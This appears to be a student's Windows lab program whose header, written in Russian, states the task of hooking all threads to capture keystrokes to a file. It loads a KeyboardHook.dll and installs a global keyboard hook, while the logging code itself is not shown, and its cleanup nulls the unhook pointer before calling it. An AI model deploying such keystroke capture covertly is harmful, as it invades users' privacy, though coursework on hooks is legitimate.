//Ульмейкин Юрий Сергеевич
//МОАИС-17/1-О
//Лабораторная работа №2 Вариант №2:
//Подвесить хук ко всем потокам, и с его помошью отлавливать нажатия на клавиши и записывать их в файл.
#include <windows.h>
#include <stdio.h>		// sprintf_s (_MBCS)
#include <tchar.h>

UINT uiKeyboardMessage = WM_NULL;

HMODULE hHookDLL = NULL;
BOOL(CALLBACK *SetKeyboardHook)() = NULL;
VOID(CALLBACK *UnhookKeyboardHook)() = NULL;

BOOL bHooked = FALSE;
WPARAM wHookParam = 0;
LPARAM lHookParam = 0;

//
// WindowProc - procedure for main window
//

LRESULT CALLBACK WndProc(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uiMsg)
	{
	case WM_CREATE:
		uiKeyboardMessage = RegisterWindowMessage(TEXT("KeyboardHook"));
		break;
	case WM_PAINT:
	{
		static TCHAR szText[256] = { 0 };
		RECT rc = { 0 };
		GetClientRect(hWnd, &rc);
		PAINTSTRUCT ps = { 0 };
		HDC hdc = BeginPaint(hWnd, &ps);
		DrawText(hdc, TEXT("tuturu"), -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
		EndPaint(hWnd, &ps);
		return 0;
	}
	case WM_DESTROY:
	{
		PostQuitMessage(0);
		break;
	}
	}

	if (uiKeyboardMessage == uiMsg)
	{
		wHookParam = wParam;
		lHookParam = lParam;
		return 0;
	}
	return DefWindowProc(hWnd, uiMsg, wParam, lParam);

}

//
// WinMain - entry point
//

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow)
{
	HANDLE hMutex = CreateMutex(0, FALSE, TEXT("HookMutex"));
	if (!hMutex)
		return 0;

	WNDCLASSEX wcx = { 0 };
	wcx.cbSize = sizeof(WNDCLASSEX);
	wcx.style = CS_HREDRAW | CS_VREDRAW;
	wcx.lpfnWndProc = WndProc;
	wcx.hInstance = hInstance;
	wcx.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wcx.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcx.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	wcx.lpszMenuName = NULL;
	wcx.lpszClassName = TEXT("ClassName");
	if (RegisterClassEx(&wcx) == 0)
		return 1;

	HWND hWnd = CreateWindowEx(0,
		TEXT("ClassName"),
		TEXT("Keyboard Hook"),
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, 0,
		CW_USEDEFAULT, 0,
		NULL, NULL, hInstance, 0);

	if (NULL == hWnd)
		return 2;
	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	if (!hHookDLL)
	{
		hHookDLL = LoadLibrary(TEXT("KeyboardHook.dll"));
		if (hHookDLL)
		{
			(FARPROC&)SetKeyboardHook = GetProcAddress(hHookDLL, "SetKeyboardHook");
			(FARPROC&)UnhookKeyboardHook = GetProcAddress(hHookDLL, "UnhookKeyboardHook");
		}
		if (SetKeyboardHook)
			bHooked = SetKeyboardHook();
	}

	MSG msg = { 0 };
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	if (hHookDLL)
	{
		bHooked = FALSE;
		UnhookKeyboardHook = NULL;
		SetKeyboardHook = NULL;
		FreeLibrary(hHookDLL);
		hHookDLL = NULL;
		if (UnhookKeyboardHook)
			UnhookKeyboardHook();
	}

	return 0;
}